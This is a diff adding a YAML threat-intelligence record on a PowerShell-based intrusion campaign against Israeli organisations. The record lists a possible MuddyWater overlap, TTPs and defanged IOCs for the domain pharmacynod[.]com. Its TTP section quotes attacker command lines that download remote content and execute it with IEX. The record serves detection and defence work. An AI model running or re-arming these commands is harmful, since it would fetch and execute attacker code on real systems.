@@ -1,0 +1,48 @@
+description: A targeted intrusion campaign impacting multiple Israeli organizations
+  using compromised internal email infrastructure and PowerShell-based infection chain.
+attribution:
+- MuddyWater (potential overlap)
+malware_families:
+- Remote Access Trojan (RAT)
+TTPs:
+  processes:
+  - powershell.exe
+  commandline:
+  - powershell IEX ((Invoke-RestMethod -Uri hxxps[:]//pharmacynod[.]com/Fix -Method
+    GET)[.]note[.]body)
+  - Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri hxxps[:]//pharmacynod[.]com//31133?did=59MVRI
+    OutFile
+  - (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri hxxps[:]//pharmacynod[.]com//35893?provider=68600).content
+  powershell:
+  - IEX ((Invoke-RestMethod -Uri hxxps[:]//pharmacynod[.]com/Fix -Method GET)[.]note[.]body)
+  - (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri hxxps[:]//pharmacynod[.]com//31133?did=59MVRI
+    OutFile
+  - (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri hxxps[:]//pharmacynod[.]com//35893?provider=68600).content
+  scripting_engine:
+  - Python
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - powershell.exe - hxxps[:]//pharmacynod[.]com/Fix
+  - powershell.exe - hxxps[:]//pharmacynod[.]com//31133?did=59MVRI
+  - powershell.exe - hxxps[:]//pharmacynod[.]com//35893?provider=68600
+  file_activity:
+  - C:\\Users\\Public\\Downloads\\test.html
+  persistence: []
+  pipes: []
+  process_relations:
+  - powershell.exe -> test.html
+IOCs:
+  hashes: []
+  IPs: []
+  domains:
+  - pharmacynod[.]com
+  URLs:
+  - hxxps[:]//pharmacynod[.]com/Fix
+  - hxxps[:]//pharmacynod[.]com//31133?did=59MVRI
+  - hxxps[:]//pharmacynod[.]com//35893?provider=68600
+authors:
+- Elad Damari
+reference: https://www.fortinet.com/blog/threat-research/clickfix-to-command-a-full-powershell-attack-chain
+date_of_publication: August 11, 2025
+file_creation_date: August 12, 2025
